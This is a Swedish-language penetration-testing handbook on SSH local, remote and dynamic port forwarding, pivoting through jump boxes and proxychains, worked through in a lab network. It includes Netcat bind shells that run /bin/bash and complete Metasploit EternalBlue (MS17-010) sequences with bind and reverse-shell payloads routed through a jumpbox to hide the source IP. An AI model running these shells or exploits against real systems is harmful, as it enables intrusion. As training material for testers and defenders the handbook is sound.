# The Cyber Plumber's Handbook (Svensk översättning)

## Innehållsförteckning
1. [Introduktion](#1-introduktion)
2. [SSH -L Lokal portvidarebefordring till fjärrmål](#2-ssh--l-lokal-portvidarebefordring-till-fjärrmål)
3. [SSH -L Portvidarebefordring genom hoppboxar](#3-ssh--l-portvidarebefordring-genom-hoppboxar)
4. [SSH -L Portvidarebefordring till fjärrmål (Fortsättning)](#4-ssh--l-portvidarebefordring-till-fjärrmål-fortsättning)
5. [SSH -R Fjärrportvidarebefordring lyssnande på 127.0.0.1](#5-ssh--r-fjärrportvidarebefordring-lyssnande-på-127001)
6. [SSH -R Fjärrportvidarebefordring lyssnande på ens33](#6-ssh--r-fjärrportvidarebefordring-lyssnande-på-ens33)
7. [SSH -D SOCKS-proxy](#7-ssh--d-socks-proxy)
8. [Avancerade ämnen](#8-avancerade-ämnen)
9. [Krediter](#9-krediter)

---

## 1. Introduktion

### 1.1 Målgrupp
Denna bok är skriven för penetrationstestare, red teamers och nätverksförsvarsare som vill förstå SSH-tunnlar, portvidarebefordring och pivot-tekniker. Om du någonsin har undrat hur du ska flytta trafik genom nätverk, nå interna tjänster eller utnyttja felkonfigurationer – då är den här boken för dig.

**Försvarsmän tänker i listor. Angripare tänker i grafer.**

### 1.2 Krav
- Kali Linux (eller annan Linux-distribution)
- SSH-klient (OpenSSH)
- Netcat (nc)
- Nmap
- Proxychains
- Metasploit Framework
- Python (för enkla webbservrar)

### 1.3 Linux BASH-alias
För att göra livet enklare, lägg till dessa alias i din `~/.bashrc`:

```bash
alias nsg='netstat -natp | grep'
alias nsl='netstat -natp | grep LISTEN'
```

### 1.4 Linux-serverkonvention
I den här boken använder vi följande IP-adresser och värdnamn:
- **KALI** - 192.168.1.200 (Angriparens box)
- **JUMPBOX1** - 192.168.1.220 (Pivot/hoppbox)
- **TARGET1** - 192.168.1.230 (Mål 1)
- **TARGET2** - 192.168.1.240 (Mål 2, dual-homed: 192.168.1.240 & 172.16.1.240)
- **TARGET3** - 172.16.1.250 (Mål 3, internt nätverk)

### 1.5 Nätverksgränssnittskort
- **ens33** - Externt nätverksgränssnitt (192.168.1.x)
- **ens34** - Internt nätverksgränssnitt (172.16.1.x) på TARGET2

### 1.6 Husanalogin
Tänk på ett nätverk som ett hus:
- **Dörrar** = Portar
- **Gångar** = Nätverk
- **Rum** = Värdar/Tjänster
- **Nycklar** = SSH-tunnlar
- **Fönster** = Alternativa ingångar (SOCKS, proxyservrar)

SSH-tunnlar låter dig "gå genom väggar" genom att skapa gångar (tunnlar) mellan rum.

### 1.7 Nätverksgrunder
- **TCP** - Transmission Control Protocol (anslutningsorienterat)
- **UDP** - User Datagram Protocol (anslutningslöst)
- **Port 22** - SSH
- **Port 80/443** - HTTP/HTTPS
- **Port 135/445** - RPC/SMB
- **Port 3389** - RDP

### 1.8 Kommandöversikt
| Kommando | Beskrivning |
|----------|-------------|
| `ssh -L` | Lokal portvidarebefordring |
| `ssh -R` | Fjärrportvidarebefordring |
| `ssh -D` | Dynamisk SOCKS-proxy |
| `ssh -J` | ProxyJump (SSH-tunnlar i tunnlar) |
| `netstat -natp` | Visa nätverksanslutningar |
| `nc -lvp <port>` | Netcat-lyssnare |
| `proxychains <kommando>` | Tvinga trafik genom SOCKS-proxy |

### 1.9 The Cyber Plumber's Lab Guide and Interactive Access
Om du inte vill konfigurera din egen miljö kan du köpa **The Cyber Plumber's Lab Guide and Interactive Access** på https://opsdisk.gumroad.com/l/cphlab vilket kommer med 45+ övningar och 28 dagars tillgång.

---

## 2. SSH -L Lokal portvidarebefordring till fjärrmål

### 2.1 Första anslutningen
I det här scenariot ska vi SSH:a in i JUMPBOX1 och konfigurera en lokal portvidarebefordring med `-L`-växeln i SSH-klienten för att ansluta till tjänster som lyssnar på TARGET1.

Från KALI, kör detta kommando:
```bash
ssh -p 22 nemo@192.168.1.220 -L 127.0.0.1:2000:192.168.1.230:2222
```

Låt oss bryta ner växlarna och alternativen:
- `-p 22` - Ange porten att SSH:a in på.
- `nemo@192.168.1.220` - Logga in på JUMPBOX1 som användare nemo.
- `-L 127.0.0.1:2000:192.168.1.230:2222` - Konfigurera en lokal portvidarebefordring på KALI på TCP 2000. Du kan verifiera detta genom att skriva `netstat -nat | egrep 2000` eller `nsg 2000`-aliaset om du laddade dessa. Detta instruerar KALI att skicka all trafik som träffar TCP 2000 på 127.0.0.1-gränssnittet på KALI, genom SSH-tunneln till JUMPBOX1, och efter att ha lämnat tunneln, ansluta till TCP 2222 på ens33-gränssnittet på TARGET1.

Det första `127.0.0.1` är underförstått om det inte anges explicit, eftersom SSH-kommandot antar att du bara vill lita på trafik som kommer från din KALI-box. Vi inkluderar det i de första exemplen så att du vänjer dig vid att se det.

### 2.2 Netcat-chatt
För den här demonstrationen ska vi initiera en SSH-anslutning till JUMPBOX1. På KALI, starta en Netcat-lyssnare på TCP 2000 på gränssnittet 127.0.0.1:
```bash
nc -nv -l 127.0.0.1 2000
```

Säkerställ att Netcat lyssnar genom att köra detta kommando på KALI:
```bash
netstat -natp | egrep 2000
```

Nu kör vi samma SSH-kommando vi gjorde i föregående avsnitt:
```bash
ssh -p 22 nemo@192.168.1.220 -L 127.0.0.1:2000:192.168.1.230:2222
```

Du kan säkerställa att den lokala portvidarebefordringen lyssnar på KALI:
```bash
netstat -natp | egrep 2000
```

Nu har vi SSH:at in i JUMPBOX1 och konfigurerat en lokal portvidarebefordring för att omdirigera all trafik som träffar KALIs 127.0.0.1-gränssnitt på TCP 2000 att gå genom tunneln till JUMPBOX1, och sedan ansluta till TARGET1s ens33-gränssnitt på TCP 2222. Låt oss försöka ansluta till Netcat-lyssnaren på KALI från JUMPBOX1 SSH-skalet. Från JUMPBOX1, kör detta kommando för att konfigurera en enkel chatt-server:
```bash
nc 127.0.0.1 2000
Hej KALI!
```

Du har nu en Netcat-chatt mellan JUMPBOX1 och KALI genom en lokal portvidarebefordring SSH-tunnel. Netcat-chatten är inte så användbar, men det är bra för att förstå grunderna i lokal portvidarebefordring.

### 2.3 Netcat-skal
I stället för en chatt, låt oss få ett skal. På TARGET1, starta en Netcat-lyssnare som kör ett skal:
```bash
nc -nv -l 192.168.1.230 -p 2222 -e /bin/bash
```

*Observera: Vissa versioner av Netcat stöder inte `-e`-växeln. Använd `rlwrap nc -lvp 2222` eller en annan metod för att få ett interaktivt skal.*

Nu, från KALI, anslut genom tunneln:
```bash
nc 127.0.0.1 2000
```

Och där har du det – ett skal på TARGET1 genom JUMPBOX1!

### 2.4 Gophish Admin Panel
Med en lokal portvidarebefordring kan du omdirigera TCP 80/443-trafik på en hoppbox tillbaka till en webbserver som körs på KALI. Detta är användbart om du behöver ladda ner en fil från en webbserver.

```bash
ssh -p 22 root@192.168.1.220 -L 192.168.1.220:80:127.0.0.1:8000
```

### 2.5 Ghost Blog Admin Panel
Liknande ovan, men för Ghost Blog admin-panelen.

### 2.6 SSH till Linux-mål
Du kan använda lokal portvidarebefordring för att SSH:a till ett Linux-mål genom en hoppbox:
```bash
ssh -p 22 nemo@192.168.1.220 -L 127.0.0.1:2022:192.168.1.230:22
```
Sedan från KALI:
```bash
ssh -p 2022 nemo@127.0.0.1
```

### 2.7 SSH-tunnlar, i tunnlar, i tunnlar
Du kan kedja SSH-tunnlar med `-J` (ProxyJump):
```bash
ssh -J nemo@192.168.1.220 nemo@192.168.1.230
```
Eller manuellt med flera `-L`:
```bash
ssh -p 22 nemo@192.168.1.220 -L 127.0.0.1:2022:192.168.1.230:22 -L 127.0.0.1:2023:172.16.1.250:22
```

### 2.8 Fjärrskrivbordsprotokoll genom en hoppbox
Använd lokal portvidarebefordring för RDP:
```bash
ssh -p 22 nemo@192.168.1.220 -L 127.0.0.1:3389:192.168.1.240:3389
```
Anslut sedan med Remmina eller rdesktop till `127.0.0.1:3389`.

### 2.9 Webbläsning
Du kan tunnla webbläsartrafik genom en hoppbox med lokal portvidarebefordring och en proxyserver, men SOCKS-proxy (`-D`) är bättre för detta – se kapitel 7.

### 2.10 Kasta exploit
Använd lokal portvidarebefordring för att kasta exploit mot ett mål genom en hoppbox. Se kapitel 4.8 för detaljerad genomgång med MS17-010 EternalBlue.

---

## 3. SSH -L Portvidarebefordring genom hoppboxar

### 3.1 Översikt
I det här kapitlet utforskar vi hur man använder flera hoppboxar för att nå djupare nätverk.

### 3.2 Första anslutningen
Anslut till JUMPBOX1 och konfigurera portvidarebefordring till TARGET1:
```bash
ssh -p 22 nemo@192.168.1.220 -L 127.0.0.1:2000:192.168.1.230:2222
```

### 3.3 Netcat-chatt
Samma som kapitel 2.2 men genom flera hoppboxar.

### 3.4 Netcat-skal
Samma princip som 2.3.

### 3.5 Gophish Admin Panel
Se 2.4.

### 3.6 Ghost Blog Admin Panel
Se 2.5.

### 3.7 SSH till Linux-mål
Se 2.6.

### 3.8 SSH-tunnlar, i tunnlar, i tunnlar
Se 2.7.

### 3.9 Fjärrskrivbordsprotokoll genom en hoppbox
Se 2.8.

### 3.10 Webbläsning
Se 2.9.

### 3.11 Kasta exploit
Se 4.8.

---

## 4. SSH -L Portvidarebefordring till fjärrmål (Fortsättning)

### 4.1 The Cyber Plumber's Lab Guide and Interactive Access
Påminnelse: Köp labbguiden på https://opsdisk.gumroad.com/l/cphlab

### 4.2 Översikt
Det här kapitlet täcker fler avancerade scenarier med lokal portvidarebefordring.

### 4.3 Första anslutningen
```bash
ssh -p 22 nemo@192.168.1.220 -L 127.0.0.1:2000:192.168.1.230:2222
```

### 4.4 Netcat-chatt
```bash
nc -nv -l 127.0.0.1 2000
```

### 4.5 Netcat-skal
```bash
nc -nv -l 192.168.1.230 -p 2222 -e /bin/bash
nc 127.0.0.1 2000
```

### 4.6 Gophish Admin Panel
```bash
ssh -p 22 root@192.168.1.220 -L 192.168.1.220:80:127.0.0.1:8000
```

### 4.7 Ghost Blog Admin Panel
Liknande 4.6.

### 4.8 Kasta Exploits
Här är ett fullständigt exempel på hur man kastar MS17-010 EternalBlue-exploit genom túnlar:

**Steg 1: Konfigurera portvidarebefordringar**
```bash
ssh -p 22 nemo@192.168.1.220 \
  -L 127.0.0.1:4450:192.168.1.240:445 \
  -L 127.0.0.1:135:192.168.1.240:135
```
- `-L 4450` - För exploit (SMB)
- `-L 135` - För RPC-arkitekturfrag

**Steg 2: Konfigurera exploit i Metasploit**
```msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 127.0.0.1
set RPORT 4450
set payload windows/x64/shell/bind_tcp
set LPORT 49188
set DisablePayloadHandler true
exploit
```

**Steg 3: Konfigurera separat payload-hanterare**
```msfconsole
use exploit/multi/handler
set payload windows/x64/shell/bind_tcp
set RHOST 192.168.1.240
set LPORT 49188
exploit
```

Observera: Exploit kan visa "FAIL" men fungera ändå. Kontrollera nätverksanslutningar på TARGET2.

### 4.9 Sammanfattning
Vi använde 3 SSH-lokala portvidarebefordringar för att kasta ett exploit och anropa payloaden. Detta gjordes från bekvämligheten av KALI-boxen och en JUMPBOX1 för att dölja vår sanna käll-IP-adress.

---

## 5. SSH -R Fjärrportvidarebefordring lyssnande på 127.0.0.1

### 5.1 The Cyber Plumber's Lab Guide and Interactive Access
Påminnelse: Köp labbguiden på https://opsdisk.gumroad.com/l/cphlab

### 5.2 Översikt
I föregående kapitel täckdes bara SSH-lokal portvidarebefordring (`-L`). Den typen av portvidarebefordring är användbar för att tunnla nätverkstrafik när trafiken kommer från KALI-boxen. Nu när du har en solid förståelse för kapaciteten och scenarier där en lokal portvidarebefordring är lämplig, är det dags att expandera din kunskap och ta itu med fjärrportvidarebefordringar!

Fjärrportvidarebefordringar (`-R`) skiljer sig från lokala portvidarebefordringar i att, efter att SSH-anslutningen upprättats, etableras en lyssnande port på den fjärranslutna boxen (JUMPBOX) som omdirigerar all trafik som träffar ett specifikt gränssnitt och port, tillbaka genom SSH-tunneln till din KALI-box.

### 5.3 Första anslutningen
I det här scenariot ska vi SSH:a in i JUMPBOX1 och konfigurera en fjärrportvidarebefordring med `-R`-växeln i SSH-klienten för att ansluta till tjänster och program som lyssnar på 127.0.0.1 på KALI.

Från KALI, kör detta kommando:
```bash
ssh -p 22 nemo@192.168.1.220 -R 127.0.0.1:5000:127.0.0.1:5555
```

Låt oss bryta ner växlarna och alternativen:
- `-p 22` - Ange porten att SSH:a in på.
- `nemo@192.168.1.220` - Logga in på JUMPBOX1 som användare nemo.
- `-R 127.0.0.1:5000:127.0.0.1:5555` - Konfigurera en fjärrportvidarebefordring på JUMPBOX1 på TCP 5000. Du kan verifiera detta genom att skriva `netstat -nat | egrep 5000` eller `nsg 5000`-aliaset om du laddade dessa, på JUMPBOX1. Detta instruerar JUMPBOX1 att skicka all trafik som träffar TCP 5000 på 127.0.0.1-gränssnittet på JUMPBOX1, genom SSH-tunneln till KALI, och efter att ha lämnat tunneln, ansluta till TCP 5555 på 127.0.0.1-gränssnittet på KALI.

Det första `127.0.0.1` är underförstått om det inte anges explicit, eftersom SSH-kommandot antar att du bara vill lita på trafik som kommer från JUMPBOX1. Vi inkluderar det i de första exemplen så att du vänjer dig vid att se det. I det här exemplet är den fjärrportvidarebefordring som valts (port 5000) på JUMPBOX1 godtycklig och kan vara vad som helst så länge:
- Du SSH:ar in som root om porten < 1024 eftersom det är privilegierade portar
- En annan tjänst eller program på JUMPBOX1 inte redan lyssnar på den porten. Om en nginx-server lyssnar på TCP 80 på alla gränssnitt (0.0.0.0), kan du inte använda kommandot: `ssh -p 22 nemo@192.168.1.220 -R 127.0.0.1:80:127.0.0.1:5555`

### 5.4 Netcat-chatt
För den här demonstrationen ska vi initiera en SSH-anslutning till JUMPBOX1. På KALI, starta en Netcat-lyssnare på TCP 5555 på gränssnittet 127.0.0.1:
```bash
nc -nv -l 127.0.0.1 5555
```

Säkerställ att Netcat lyssnar genom att köra detta kommando på KALI:
```bash
netstat -natp | egrep 5555
```

Nu kör vi samma SSH-kommando vi gjorde i föregående avsnitt:
```bash
ssh -p 22 nemo@192.168.1.220 -R 127.0.0.1:5000:127.0.0.1:5555
```

Du kan säkerställa att fjärrportvidarebefordringen lyssnar på JUMPBOX1:
```bash
netstat -natp | egrep 5000
```

Så vid den här punkten har vi SSH:at in i JUMPBOX1 och konfigurerat en fjärrportvidarebefordring för att omdirigera all trafik som träffar JUMPBOX1s 127.0.0.1-gränssnitt på TCP 5000 att gå genom tunneln tillbaka till KALI, och sedan ansluta till KALIs 127.0.0.1-gränssnitt på TCP 5555. Låt oss försöka ansluta till Netcat-lyssnaren på KALI från JUMPBOX1 SSH-skalet. Från JUMPBOX1, kör detta kommando för att konfigurera en enkel chatt-server:
```bash
nc 127.0.0.1 5000
Hej KALI!
```

Du har nu en Netcat-chatt mellan JUMPBOX1 och KALI genom en fjärrportvidarebefordring SSH-tunnel. Netcat-chatten är inte så användbar, men det är gynnsamt för att förstå grunderna i fjärrportvidarebefordring.

### 5.5 Scantron-motortunnlar
Ett mer praktiskt fall av att utnyttja fjärrportvidarebefordringar som lyssnar på den fjärranslutna boxens 127.0.0.1-gränssnitt finns i Scantron, den distribuerade nmap/masscan-skannern. Kolla in README för att få en bättre idé om hur det fungerar (https://github.com/rackerlabs/scantron).

Med Scantron "ligger alla nmap-målfil och nmap-resultat på konsollen och delas genom en nätverksfilresurs (NFS) som utnyttjar SSH-tunnlar". Konsolboxen initierar en SSH-anslutning till en motor, konfigurerar sedan fjärrportvidarebefordringar, så att bara motorn kan ringa tillbaka till REST API:et (`-R 4430:127.0.0.1:443`) och komma åt nätverksfilresursen (`-R 2049:127.0.0.1:2049`) som är värd på konsollen.

Här är det fullständiga kommandot, som använder autossh för att upprätthålla anslutningen:
```bash
# Konsoll --> Motor 1
su - autossh -s /bin/bash -c 'autossh -M 0 -f -N \
  -o "StrictHostKeyChecking no" -o "ServerAliveInterval 60" \
  -o "ServerAliveCountMax 3" -p 22 -R 4430:127.0.0.1:443 \
  -R 2049:127.0.0.1:2049 -i /home/scantron/console/autossh.key \
  autossh@192.168.1.100'

# Konsoll --> Motor 2
su - autossh -s /bin/bash -c 'autossh -M 0 -f -N \
  -o "StrictHostKeyChecking no" -o "ServerAliveInterval 60" \
  -o "ServerAliveCountMax 3" -p 22 -R 4430:127.0.0.1:443 \
  -R 2049:127.0.0.1:2049 -i /home/scantron/console/autossh.key \
  autossh@192.168.1.101'
```

Dessutom, "om konsollen inte kan SSH:a till en motor, körs autossh-kommandot på motorn och portvidarebefordringarna blir lokala (`-L`) istället för fjärra (`-R`)".

Att ha en fjärrportvidarebefordring som lyssnar på 127.0.0.1 dyker upp inte så ofta. Kraften i en fjärrportvidarebefordring ligger i förmågan att ändra gränssnittet från 127.0.0.1 till ens33, vilket vi ska utforska i nästa kapitel.

---

## 6. SSH -R Fjärrportvidarebefordring lyssnande på ens33

### 6.1 The Cyber Plumber's Lab Guide and Interactive Access
Påminnelse: Köp labbguiden på https://opsdisk.gumroad.com/l/cphlab

### 6.2 Översikt
Hur kunde vi modificera vårt SSH-kommando för att tillåta en annan box (TARGET1) att ansluta till KALI genom att gå via JUMPBOX1? Låt oss granska kommandot och beskrivningen som användes i förra avsnittet, men kör inte kommandot:
```bash
ssh -p 22 nemo@192.168.1.220 -R 127.0.0.1:5000:127.0.0.1:5555
```

Detta konfigurerar en fjärrportvidarebefordring på JUMPBOX1s 127.0.0.1-gränssnitt på TCP 5000. Du kan verifiera detta genom att skriva `netstat -nat | egrep 5000` på JUMPBOX1. Detta instruerar all trafik som träffar TCP 5000 på 127.0.0.1-gränssnittet på JUMPBOX1 att gå genom SSH-tunneln tillbaka till KALI, och efter att ha lämnat tunneln, ansluta till TCP 5555 på 127.0.0.1-gränssnittet på KALI.

Det första `127.0.0.1` är markerat för att det är vad vi ska ändra. Istället för att lyssna på 127.0.0.1 på JUMPBOX1, kommer vi att ange det externa ens33-gränssnittet på JUMPBOX1. Så det nya kommandot blir:
```bash
ssh -p 22 nemo@192.168.1.220 -R 192.168.1.220:5000:127.0.0.1:5555
```

Om du inte redan gjort det, se till att lägga till `"GatewayPorts clientspecified"` i `/etc/ssh/sshd_config`-filen och starta om SSH-tjänsten för din JUMPBOX. Låt oss dyka in i ett exempel för att se det i aktion!

### 6.3 Netcat-chatt
På KALI, starta en Netcat-lyssnare på TCP 8888 på gränssnittet 127.0.0.1:
```bash
nc -nv -l 127.0.0.1 8888
```

Säkerställ att Netcat lyssnar genom att köra och lyssna med detta kommando på KALI:
```bash
netstat -natp | egrep 8888
```

Från KALI, SSH:a in i JUMPBOX1 och konfigurera fjärrportvidarebefordring för att instruera all trafik som träffar ens33-gränssnittet på JUMPBOX1 på TCP 8000 att ansluta till 127.0.0.1-gränssnittet på TCP 8888 på KALI:
```bash
ssh -p 22 nemo@192.168.1.220 -R 192.168.1.220:8000:127.0.0.1:8888
```

För den här demonstrationen ska vi även initiera en vanilla SSH-anslutning till TARGET1 för att få ett skal på boxen:
```bash
ssh -p 22 nemo@192.168.1.230
```

Så vid den här punkten har vi 2 SSH-anslutningar. Den första är för att konfigurera vår faktiska fjärrportvidarebefordring. Den andra ger oss ett vanilla skal på TARGET1 som låter oss köra Netcat. Så låt oss försöka ansluta till Netcat-lyssnaren på KALI från TARGET1 genom att gå via JUMPBOX1. Från TARGET1-boxen, kör detta kommando för att konfigurera ett enkelt chattprogram:
```bash
nc 192.168.1.220 8000
Hej KALI!
```

Sammanfattningsvis konfigurerade vi en fjärrportvidarebefordringstunnel som omdirigerar all trafik som träffar TCP 8000 på JUMPBOX1s externa ens33-gränssnitt, att gå genom SSH-tunneln och ansluta till en Netcat-lyssnare som körs på TCP 8888 på KALIs 127.0.0.1-gränssnitt.

### 6.4 WWW-server till 127.0.0.1
Med en omvänd portvidarebefordring kan du omdirigera TCP 80/443-trafik på en JUMPBOX tillbaka till en webbserver som körs på KALI. Detta är användbart om du behöver ladda ner en fil från en webbserver. I det här exemplet använder vi en enkel Python-baserad HTTP-server på KALI:
```bash
python -m SimpleHTTPServer 8000
```

SSH:a in i JUMPBOX1 som root för att vi ska lyssna på en privilegierad port (TCP 80). Sedan från TARGET1, använd wget för att hämta en fil från "webbservern" på JUMPBOX1, när filen i verklighet serveras från KALI:
```bash
ssh -p 22 root@192.168.1.220 -R 192.168.1.220:80:127.0.0.1:8000
```

Ett verktyg som gör detta också är ngrok. ngrok (https://ngrok.com) är ett icke-SSH-verktyg som uppnår samma funktionalitet som fjärrportvidarebefordringsexemplet vi just täckte. Istället för att använda din JUMPBOX1 måste du använda en av deras servrar. ngrok erbjuder "säkra introspekterbara tunnlar till localhost" och används främst av webbutvecklare för att exponera en lokal webbserver som körs på deras bärbara dator till Internet, så kunder eller klienter kan se en beta-webbplats istället för att pusha den till en molnleverantör. Det låter dig också "exponera vilken nätverkstjänst som helst som kör över TCP. Detta används ofta för att exponera SSH, spel-servrar, databaser och mer." (https://ngrok.com/docs#tcp).

Inga explicita exempel kommer att ges i det här avsnittet, men kolla in verktyget och dokumentationen. För nätverksförsvarsare, hur kan det programmet missbrukas? Tänk på de illegitima användningarna för ngrok.

### 6.5 Exploit-återanrop med -R
I avsnitt 4.8 använde vi tre `-L` lokala portvidarebefordringar för att kasta ett exploit och ringa in en Meterpreter-payload. Även om detta fungerade, litat det på att brandväggen var inaktiverad på TARGET1. I verkligheten är värdbaserade brandväggar riktigt bra på att blockera slumpmässiga inkommande anslutningar, men är ganska generösa med vad de tillåter utåt. Vanligtvis blockeras utgående TCP 443 sällan av en värdbaserad brandvägg, så låt oss utnyttja den informationen för att modifiera vår payload. I det här exemplet behöver vi att JUMPBOX1 lyssnar på en privilegierad port (TCP 443), så vi måste SSH:a in som root.

```bash
ssh -p 22 root@192.168.1.220 \
  -L 4450:192.168.1.240:445 \
  -L 135:192.168.1.240:135 \
  -R 192.168.1.220:443:127.0.0.1:4430
```

De lokala portvidarebefordringarna (`-L 4450` och `-L 135`) kommer att användas för att kasta exploitet och RPC-arkitekturfrågan, respektive.
Fjärrportvidarebefordringen (`-R 192.168.1.220:443:127.0.0.1:4430`) kommer att användas för payload-återanropet.

**Konfigurera exploitet och ange en omvänd TCP-payload för att ringa tillbaka till JUMPBOX1 på TCP 443:**
```msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 127.0.0.1
set RPORT 4450
set payload windows/x64/shell/reverse_tcp
set LHOST 192.168.1.220
set LPORT 443
set DisablePayloadHandler true
```

**Konfigurera en separat payload-hanterare för att avkoppla den från exploitet. Det är kritiskt att sätta DisablePayloadHandler till true, annars kommer KALI att försöka lyssna på 192.168.1.220-gränssnittet som inte existerar, eftersom det är JUMPBOX1s IP-adress.**
```msfconsole
use exploit/multi/handler
set payload windows/x64/shell/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4430
exploit
```

Vid den här punkten är du redo att kasta exploitet från din KALI-box, genom JUMPBOX1, till TARGET2. Om exploitet lyckas och vi får fjärrkodkörning, kommer vår payload att köras, vilken vi valde som en omvänd Meterpreter-payload. Den Meterpreter-payloaden instruerades att ringa tillbaka till JUMPBOX1 på TCP 443, vilket kommer att åka SSH-tunneln tillbaka till vår KALI-box och ansluta till TCP 4430 på 127.0.0.1. Så skjut iväg från exploit-modulen! Observera att eftersom vi avkopplat payload-hanteraren från att kasta exploitet, är verbalskildringarna vid kastning av exploitet vilseledande, för det kan säga "FAIL", men i verkligheten fungerade det. Låt oss kolla vår hanterare... ser bra ut!

I det här scenariot kastade vi ett exploit från JUMPBOX1 och fick ett återanrop till JUMPBOX1. Ur försvararens perspektiv ser de bara exploit- och återanropstrafiken till JUMPBOX1, och utan deras vetskap utnyttjar vi SSH-tunnlar för att skydda vår käll-IP.

---

## 7. SSH -D SOCKS-proxy

### 7.1 The Cyber Plumber's Lab Guide and Interactive Access
Påminnelse: Köp labbguiden på https://opsdisk.gumroad.com/l/cphlab

### 7.2 Översikt
SSH-protokollet stöder att upprätta en SOCKS-proxy som kan användas för att tunnla trafik. En SOCKS-proxy tar en anslutningsbegäran från KALI, gör sedan en ny anslutning till ett mål.

Ett av verktygen som kommer att användas genom dessa exempel är proxychains. proxychains är ett Linux-baserat verktyg för att "proxifiera" nätverksapplikationer som inte har inbyggt proxystöd. Konfiguration innebär att specificera en SOCKS4/5-proxy i `/etc/proxychains.conf`-filen och sätta "proxychains" framför ett nätverksbaserat verktyg för att tvinga trafiken genom proxyn. Ett exempel skulle vara:
```bash
proxychains nmap 192.168.1.221 -sT -p 80,443
```

### 7.3 Installera proxychains
Kali levereras med proxychains som standard. Om du måste installera det, skriv bara:
```bash
sudo apt update
sudo apt install proxychains -y
```

Konfigurationsfilen finns här: `/etc/proxychains.conf`. Öppna den med din favorittextredigerare och scrolla ner till botten. Det är här olika proxykonfigurationer kan konfigureras. Vi kommer inte att beröra det i den här boken, men det kan också utnyttjas med HTTP/HTTPS-proxyservrar. Standardproxychains-porten för en SOCKS-proxy är TCP 9050 och det är vad som kommer att användas genom exemplen.

### 7.4 Netcat-chatt
För den här demonstrationen ska vi initiera en vanilla SSH-anslutning till TARGET1 för att få ett skal på boxen:
```bash
ssh -p 22 nemo@192.168.1.230
```

Nu när du är på TARGET1, starta en Netcat-lyssnare på TCP 2222 på gränssnittet ens33:
```bash
nc -nv -l 192.168.1.230 -p 2222
```

Som en påminnelse, så såg vårt kommando ut från ett tidigare avsnitt för att göra en Netcat-anslutning från KALI till TARGET1 genom JUMPBOX1. Kör inte detta kommando. Vi specificerade TARGET1 IP (192.168.1.230) och destinationsport (TCP 2222).
```bash
ssh -p 22 nemo@192.168.1.220 -L 127.0.0.1:2000:192.168.1.230:2222
```

Nu låt oss se hur det skiljer sig genom att skapa en SOCKS-proxy:
```bash
ssh -p 22 nemo@192.168.1.220 -D 127.0.0.1:9050
```

Det är mycket enklare! `127.0.0.1` i `127.0.0.1:9050` är underförstått om det inte anges explicit, eftersom SSH-kommandot antar att du bara vill lita på trafik som kommer från din KALI-box. Vi inkluderar det i de första exemplen så att du vänjer dig vid att se det.

Vid den här punkten har vi 2 SSH-anslutningar. Den första ger oss ett vanilla skal på TARGET1 som låter oss köra Netcat. Den andra är för att konfigurera vår SOCKS-proxytunnel. Så låt oss försöka ansluta till Netcat-lyssnaren på TARGET1, genom att gå via JUMPBOX1. För att utnyttja denna nya SOCKS-proxy behöver vi "proxifiera" Netcat eftersom den inte erbjuder inbyggt proxystöd. Som referens, från KALI-boxen, var detta det ursprungliga Netcat-kommandot som användes för att ansluta. Kör inte faktiskt detta kommando.
```bash
nc 127.0.0.1 2000
Hej TARGET1!
```

Vårt nya kommando att köra blir detta:
```bash
proxychains nc 192.168.1.230 2222
Hej TARGET1!
```

Om du tittar på Netcat-alternativen (`nc -h`), kommer du att märka att det faktiskt stödjer proxyservrar! Så ett annat kommandonalternativ är:
```bash
nc -X 5 -x 127.0.0.1:9050 192.168.1.230 2222
```

Titta på skillnaden. proxychains tvingar det genom vår SOCKS-proxy (på JUMPBOX1), så vi kan använda den faktiska destinations-IP (192.168.1.230) och destinationsport (TCP 2222). Att utnyttja en SOCKS-proxy innebär att vi inte behöver konfigurera explicita lokala portvidarebefordringar för varje destination. Om vi ville ansluta till TARGET1 på TCP 3333, skulle kommandot enkelt vara:
```bash
proxychains nc 192.168.1.230 3333
```

SOCKS-proxyn är mer generisk, flexibel och återanvändbar (därav "dynamisk" som du ibland ser föregående) om du behöver göra anslutningar till flera mål. Som en påminnelse, om ett verktyg inte har inbyggt SOCKS-proxystöd, måste ett proxifieringsverktyg som proxychains användas.

### 7.5 Webbläsning
Som tidigare nämnts, är en SOCKS-proxy mer flexibel när det gäller att utnyttja samma tunnel för att skicka olika typer av trafik genom den till olika portar. En av styrkorna är att modifiera en webbläsares konfiguration för att utnyttja den. Med SOCKS5 kan du till och med tunnla dina UDP DNS-förfrågningar, så att de inte läcker till den lokala DNS-servern. Som exempel, när jag resade, brukade jag SSH:a tillbaka till min hemmarouter och göra all min surfning genom en dynamisk SOCKS-proxy. Detta hindrade hotellet från att se vilka webbplatser jag surfade till och hindrade även manipulation av data eftersom allt var krypterat inom SSH-tunneln. Jag var också säker på att vidarebefordra alla DNS-förfrågningar genom tunneln också, annars, även om hotellet inte kunde se min webbläsartrafik, varje gång jag behövde göra en DNS-uppslag, skulle det läcka domänen jag begärde till hotellets DNS-server.

#### 7.5.1 Firefox
Konfigurera Firefox-webbläsaren för att utnyttja en SOCKS-proxy i antingen Linux eller Windows. Se till att kryssa i "Proxy DNS when using SOCKS v5"-rutan för att förhindra DNS-uppslagsläckage.

#### 7.5.2 Chrome
Ur lådan förlitar sig Chrome på Windows systemomfattande proxyinställningar.

I Linux kräver konfiguration av Chrome-webbläsaren för att utnyttja en SOCKS-proxy en kommandoradsväxling som `--proxy-server="socks5://foobar:1080"` läggs till vid start.

### 7.6 curl
curl är "ett verktyg för att överföra data från eller till en server". Till skillnad från nmap som inte har inbyggt proxystöd, erbjuder curl "en busslast med användbara knep som proxystöd" (https://linux.die.net/man/1/curl). Denna kapacitet exponeras med `-x`-växeln.

Använda en SOCKS-proxy är enkelt:
```bash
curl -x socks5://127.0.0.1:9050 http://www.lolcats.com
```

### 7.7 nmap-skanning
nmap har inte inbyggt SOCKS-proxystöd, så ett verktyg som proxychains måste användas. Några anmärkningar:
- Endast `-sT` (TCP full connect) kan användas eftersom SOCKS-proxyn tar den initiala anslutningen från KALI till JUMPBOX1, och gör sedan en ny anslutning från JUMPBOX1 till TARGET1.
- Skanningen kommer att ta längre tid på grund av den extra anslutningskostnaden med SOCKS-proxyn, så välj dina portar klokt.

Det här är hur en typisk nmap-skanning genom en SOCKS-proxy skulle se ut mot scanme.nmap.org (45.33.32.156) efter att ha konfigurerat en dynamisk SOCKS-proxy. Konfigurera en SOCKS-proxy efter att ha SSH:at in i JUMPBOX1:
```bash
